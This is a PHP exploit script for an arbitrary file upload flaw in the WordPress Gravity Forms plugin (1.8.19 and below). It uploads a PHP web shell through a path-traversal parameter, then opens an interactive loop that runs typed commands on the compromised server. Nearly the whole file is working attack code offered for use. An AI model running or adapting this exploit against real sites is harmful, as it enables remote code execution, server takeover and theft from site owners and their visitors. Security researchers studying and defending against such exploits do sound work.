<?php

# Exploit Title: Wordpress Gravity Forms - Arbitrary File Upload
# Vendor Homepage: http://www.gravityforms.com/
# Vulnerable Version(s): 1.8.19 (and below)
# Exploit Author: Abk Khan
# Contact: [ an0nguy @ protonmail.ch ]
# Website: http://blog.lolwaleet.com/
# Category: webapps
# PS: I just wrote the exploit code by reading this write-up [ goo.gl/816np5 ] -- Don't know who found the vulnerability!

error_reporting(0);

$domain    = 'http://localhost/wordpress';
$url       = "$domain/?gf_page=upload";
$shell     = "$domain/wp-content/_input_3_khan.php5";
$separator = '-----------------------------------------------------';

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '<?=system($_GET[0]);?>&form_id=1&name=khan.php5&gform_unique_id=../../../../&field_id=3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

if (eregi('ok', $response)) {
    echo "$separator\nShell at $shell\n$separator\n\n";
    while ($testCom != 'bubye!') {
		$user = trim(get_string_between(file_get_contents("$shell?0=echo%20'~';%20whoami;%20echo%20'~'"), '~', '~'));
        echo "$user@b0x:~$ ";
        $handle  = fopen("php://stdin", 'r');
        $testCom = trim(fgets($handle));
        fclose($handle);
        $comOut = trim(get_string_between(file_get_contents("$shell?0=echo%20'~';%20" . urlencode($testCom) . ";%20echo%20'~'"), '~', '~')) . "\n";
        echo $comOut;
    }
}
else {
	die("$separator\n$domain doesn't seem to be vulnerable! :(\n$separator");
}

function get_string_between($string, $start, $end)
{
    # stolen from stackoverflow!
    $string = " " . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return "";
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
?> 